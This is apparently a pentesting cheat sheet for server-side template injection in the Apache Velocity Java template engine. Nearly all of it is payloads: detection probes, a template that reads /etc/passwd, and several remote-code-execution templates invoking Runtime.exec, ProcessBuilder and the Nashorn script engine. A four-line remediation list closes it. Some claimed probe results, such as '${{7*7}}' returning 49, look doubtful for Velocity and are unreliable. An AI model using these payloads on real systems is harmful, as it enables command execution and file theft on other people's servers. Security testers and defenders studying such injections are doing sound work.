# Velocity / Java — Template Engine

## Summary
Apache Velocity is a Java template engine, common in legacy Java web apps.

## Identification
```velocity
${{7*7}}     → 49
${7*7}       → 49
$7*7         → 49       (if auto-parse enabled)
$foo.bar     → evaluated as object property
```

## Basic Confirmation
```velocity
${{7*7}}
${math.add(7,7)}
```

## Read Files
```velocity
#set($read = $file)
$read.read("/etc/passwd")
```

## RCE

```velocity
# Execute command
#set($exec = $runtime.getRuntime().exec("id"))
$exec

# Via Runtime
#set($str = $class.inspect("java.lang.Runtime").getRuntime().exec("id"))
$str

# Via ProcessBuilder
#set($pb = $class.inspect("java.lang.ProcessBuilder").newInstance(["id"]))
$pb.start()

# Via ScriptEngine (Nashorn)
#set($engine = $class.inspect("javax.script.ScriptEngineManager").newInstance().getEngineByName("js"))
$engine.eval("java.lang.Runtime.getRuntime().exec('id')")
```

## Remediation
- Restrict tool access in Velocity context
- Use Velocity SecurityManager
- Never allow user input in templates
- Prefer Freemarker over Velocity for new development
